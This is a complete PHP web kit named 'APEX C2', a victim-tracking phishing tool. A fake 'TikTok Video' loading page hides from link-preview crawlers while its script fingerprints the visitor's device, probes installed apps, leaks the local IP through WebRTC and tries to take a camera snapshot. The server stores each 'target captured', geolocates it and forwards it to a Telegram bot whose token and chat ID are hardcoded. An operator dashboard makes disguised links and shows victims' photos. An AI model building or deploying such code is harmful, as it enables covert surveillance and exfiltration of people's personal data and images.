<?php
// ==============================================================================
// 🚀 APEX C2 - V21 (Fully Functional Enterprise Tracker)
// ==============================================================================

date_default_timezone_set('Africa/Algiers');
session_start();
error_reporting(0);

// --- Database Setup ---
$db_file = __DIR__ . '/apex_c2.sqlite';
try {
    $db = new PDO('sqlite:' . $db_file);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
    
    $db->exec("CREATE TABLE IF NOT EXISTS operators (id INTEGER PRIMARY KEY, username TEXT, pass_hash TEXT)");
    if ($db->query("SELECT COUNT(*) FROM operators")->fetchColumn() == 0) {
        $db->prepare("INSERT INTO operators (username, pass_hash) VALUES ('admin', ?)")->execute([password_hash('aziz123', PASSWORD_DEFAULT)]);
    }

    $db->exec("CREATE TABLE IF NOT EXISTS links (id INTEGER PRIMARY KEY, code TEXT UNIQUE, target_url TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)");
    
    $db->exec("CREATE TABLE IF NOT EXISTS captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        code TEXT, ip TEXT, local_ip TEXT, location TEXT, isp TEXT,
        device TEXT, hw_profile TEXT, canvas_fp TEXT, gpu_info TEXT,
        battery TEXT, apps TEXT, image_data TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (Exception $e) { die("DB Error: " . $e->getMessage()); }

// --- Telegram Function ---
function sendTelegram($msg) {
    $token = '8701062671:AAHPiY9DOr1HNRNQzlb4-4XIhVroYzEMjEU'; 
    $chat_id = '6475721500';
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['chat_id' => $chat_id, 'text' => $msg, 'parse_mode' => 'HTML']));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch); curl_close($ch);
}

// --- Helper: Get IP Info ---
function getIpInfo($ip) {
    if ($ip == '127.0.0.1' || strpos($ip, '192.168') === 0) return ['loc' => 'Local', 'isp' => 'Internal'];
    $ch = curl_init("http://ip-api.com/json/{$ip}?fields=status,country,city,isp");
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 3]);
    $json = curl_exec($ch); curl_close($ch);
    $data = json_decode($json, true);
    if (($data['status'] ?? '') === 'success') {
        return ['loc' => ($data['city'] ?? '') . ', ' . ($data['country'] ?? ''), 'isp' => $data['isp'] ?? 'Unknown'];
    }
    return ['loc' => 'Unknown', 'isp' => 'Unknown'];
}

// ==============================================================================
// 1. TRACKER PAGE (The Lure)
// ==============================================================================
if (isset($_GET['r'])) {
    $code = $_GET['r'];
    $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link = $stmt->fetch();
    if (!$link) die("Invalid Link.");

    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    if (preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook/i', $ua)) {
        echo '<html><head><meta property="og:image" content="https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80"></head><body></body></html>';
        exit;
    }

    // Receive Data from JS
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['data'])) {
        $data = json_decode($_POST['data'], true);
        $ip = $_SERVER['REMOTE_ADDR'];
        $ipInfo = getIpInfo($ip);

        $stmt = $db->prepare("INSERT INTO captures (code, ip, local_ip, location, isp, device, hw_profile, canvas_fp, gpu_info, battery, apps, image_data) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)");
        $stmt->execute([
            $code, $ip, $data['local_ip'] ?? 'Direct', $ipInfo['loc'], $ipInfo['isp'],
            $data['device'] ?? 'Unknown', $data['hw'] ?? 'N/A', $data['canvas'] ?? 'N/A',
            $data['gpu'] ?? 'N/A', $data['battery'] ?? 'N/A', $data['apps'] ?? 'None',
            $data['image'] ?? ''
        ]);

        $msg = "🚨 <b>NEW TARGET CAPTURED</b>\n\n";
        $msg .= "📍 Location: {$ipInfo['loc']}\n";
        $msg .= "📡 ISP: {$ipInfo['isp']}\n";
        $msg .= "🔗 IP: <code>{$ip}</code>\n";
        $msg .= "🏠 Local IP: <code>" . ($data['local_ip'] ?? 'N/A') . "</code>\n";
        $msg .= "📱 Device: {$data['device']}\n";
        $msg .= "🧠 HW: {$data['hw']}\n";
        $msg .= "🎮 GPU: {$data['gpu']}\n";
        $msg .= "📲 Apps: {$data['apps']}\n";
        sendTelegram($msg);
        exit('OK');
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Video</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
        .loader { border: 4px solid #333; border-top: 4px solid #ff0050; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #888; font-size: 14px; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Loading video...</p>

    <script>
        async function run() {
            let data = { device: navigator.userAgent };
            
            // 1. GPU Info
            try {
                let c = document.createElement('canvas'); let gl = c.getContext('webgl');
                let ext = gl.getExtension('WEBGL_debug_renderer_info');
                data.gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
            } catch(e) { data.gpu = 'Unknown'; }

            // 2. Canvas Fingerprint
            try {
                let c = document.createElement('canvas'); let ctx = c.getContext('2d');
                ctx.fillStyle = "#f60"; ctx.fillRect(10, 10, 50, 50);
                data.canvas = c.toDataURL().slice(-20);
            } catch(e) {}

            // 3. HW Profiling (Timing)
            let start = performance.now();
            for(let i=0; i<100000; i++) Math.sqrt(i);
            data.hw = "Speed_" + Math.round(performance.now() - start) + "ms";

            // 4. Battery
            try { let b = await navigator.getBattery(); data.battery = Math.round(b.level * 100) + "%"; } catch(e) {}

            // 5. App Fingerprinting
            let apps = []; let schemes = {'WA':'whatsapp://', 'TG':'tg://', 'IG':'instagram://'};
            for (let [name, link] of Object.entries(schemes)) {
                let t0 = performance.now();
                let iframe = document.createElement('iframe'); iframe.style.display='none'; iframe.src=link;
                document.body.appendChild(iframe);
                await new Promise(r => setTimeout(r, 100));
                if (performance.now() - t0 > 80) apps.push(name);
                document.body.removeChild(iframe);
            }
            data.apps = apps.join(', ') || 'None';

            // 6. Local IP
            try {
                let pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
                pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (e) => {
                    if(e.candidate) {
                        let ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                        if(ip && !ip[1].endsWith('.local')) data.local_ip = ip[1];
                    }
                };
                await new Promise(r => setTimeout(r, 500));
            } catch(e) {}

            // 7. Camera Capture
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream; await video.play();
                await new Promise(r => setTimeout(r, 300));
                const canvas = document.createElement('canvas');
                canvas.width = 320; canvas.height = 240;
                canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
                data.image = canvas.toDataURL('image/jpeg', 0.5);
                stream.getTracks().forEach(t => t.stop());
            } catch(e) {}

            // Send Data
            let fd = new URLSearchParams();
            fd.append('data', JSON.stringify(data));
            
            // Use sendBeacon for extreme speed
            navigator.sendBeacon(window.location.href, fd);
            
            setTimeout(() => {
                window.location.replace("<?php echo $link['target_url']; ?>");
            }, 1000);
        }
        window.addEventListener('DOMContentLoaded', run);
    </script>
</body>
</html>
<?php
    exit;
}

// ==============================================================================
// 2. C2 DASHBOARD
// ==============================================================================
$is_logged = isset($_SESSION['c2_user']);
$login_err = '';

if (isset($_POST['login'])) {
    $stmt = $db->prepare("SELECT * FROM operators WHERE username = ?"); $stmt->execute([$_POST['username']]);
    $op = $stmt->fetch();
    if ($op && password_verify($_POST['password'], $op['pass_hash'])) {
        $_SESSION['c2_user'] = $op['username']; header("Location: /"); exit;
    } else { $login_err = "Invalid Credentials."; }
}
if (isset($_GET['logout'])) { session_destroy(); header("Location: /"); exit; }

$link = "";
if ($is_logged && isset($_POST['create'])) {
    $code = strtoupper(substr(md5(uniqid()), 0, 6));
    $db->prepare("INSERT INTO links (code, target_url) VALUES (?, ?)")->execute([$code, $_POST['url']]);
    $link = "https://".$_SERVER['HTTP_HOST']."/?r=".$code;
}

$captures = [];
if ($is_logged) {
    $captures = $db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 20")->fetchAll();
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>APEX C2 - Dashboard</title>
    <style>
        :root { --bg: #0a0a0c; --panel: #121216; --border: #2a2a35; --text: #d1d5db; --accent: #ef4444; --success: #10b981; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
        body { background: var(--bg); color: var(--text); padding: 20px; }
        
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; border-bottom: 1px solid var(--border); padding-bottom: 20px; }
        .header h1 { color: #fff; font-size: 20px; }
        
        .generator { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 20px; margin-bottom: 30px; display: flex; gap: 10px; }
        .generator input { flex: 1; padding: 12px; background: #000; border: 1px solid #333; color: #fff; border-radius: 4px; outline: none; }
        .generator button { padding: 12px 24px; background: var(--accent); color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
        .card { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; transition: 0.3s; }
        .card:hover { border-color: var(--accent); transform: translateY(-2px); }
        .card img { width: 100%; height: 200px; object-fit: cover; background: #000; }
        .data { padding: 15px; font-size: 13px; }
        .row { display: flex; justify-content: space-between; margin-bottom: 8px; border-bottom: 1px dashed #222; padding-bottom: 4px; }
        .row span { color: #fff; font-weight: 500; }
        
        .login-box { max-width: 400px; margin: 100px auto; background: var(--panel); padding: 40px; border: 1px solid var(--accent); border-radius: 8px; text-align: center; }
        .login-box input { width: 100%; padding: 12px; margin-bottom: 15px; background: #000; border: 1px solid #333; color: #fff; }
        .login-box button { width: 100%; padding: 12px; background: var(--accent); color: #fff; border: none; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<?php if (!$is_logged): ?>
    <div class="login-box">
        <h1 style="color:var(--accent); margin-bottom: 20px;">C2 LOGIN</h1>
        <?php if($login_err) echo "<p style='color:red;'>$login_err</p>"; ?>
        <form method="POST">
            <input type="text" name="username" placeholder="Username (admin)" required>
            <input type="password" name="password" placeholder="Password (aziz123)" required>
            <button name="login">ACCESS</button>
        </form>
    </div>
<?php else: ?>

    <div class="header">
        <h1>👑 APEX C2 - Real Data</h1>
        <a href="?logout=1" style="color: var(--accent); text-decoration: none;">[Logout]</a>
    </div>

    <div class="generator">
        <form method="POST" style="display: flex; width: 100%; gap: 10px;">
            <input type="text" name="url" placeholder="Target URL (e.g. tiktok.com/...)" required>
            <button name="create">Generate Link</button>
        </form>
    </div>

    <?php if($link): ?>
        <div style="background: rgba(16,185,129,0.1); border: 1px solid var(--success); padding: 15px; border-radius: 8px; margin-bottom: 20px; word-break: break-all;">
            <b style="color:var(--success);">Link Ready:</b> <a href="<?php echo $link; ?>" target="_blank" style="color:#fff;"><?php echo $link; ?></a>
        </div>
    <?php endif; ?>

    <div class="grid">
        <?php if(empty($captures)): ?>
            <p style="color: #666; text-align: center; width: 100%;">No targets captured yet.</p>
        <?php else: ?>
            <?php foreach($captures as $c): ?>
                <div class="card">
                    <?php if($c['image_data']): ?>
                        <img src="<?php echo $c['image_data']; ?>" alt="Camera">
                    <?php else: ?>
                        <div style="height: 200px; display: flex; align-items: center; justify-content: center; color: #444; background: #000;">No Camera Data</div>
                    <?php endif; ?>
                    
                    <div class="data">
                        <div class="row"><span>IP:</span> <b style="color:var(--accent);"><?php echo $c['ip']; ?></b></div>
                        <div class="row"><span>Local IP:</span> <span><?php echo $c['local_ip']; ?></span></div>
                        <div class="row"><span>Location:</span> <span><?php echo $c['location']; ?></span></div>
                        <div class="row"><span>ISP:</span> <span><?php echo $c['isp']; ?></span></div>
                        <div class="row"><span>Device:</span> <span style="font-size: 10px;"><?php echo substr($c['device'], 0, 40).'...'; ?></span></div>
                        <div class="row"><span>GPU:</span> <span style="font-size: 10px;"><?php echo substr($c['gpu_info'], 0, 40); ?></span></div>
                        <div class="row"><span>HW Speed:</span> <span><?php echo $c['hw_profile']; ?></span></div>
                        <div class="row"><span>Battery:</span> <span><?php echo $c['battery']; ?></span></div>
                        <div class="row"><span style="color:var(--accent);">Apps Found:</span> <b><?php echo $c['apps']; ?></b></div>
                        <div class="row" style="border: none; font-size: 11px; color: #666; margin-top: 10px;"><span>Date:</span> <span><?php echo $c['created_at']; ?></span></div>
                    </div>
                </div>
            <?php endforeach; ?>
        <?php endif; ?>
    </div>

<?php endif; ?>
</body>
</html>
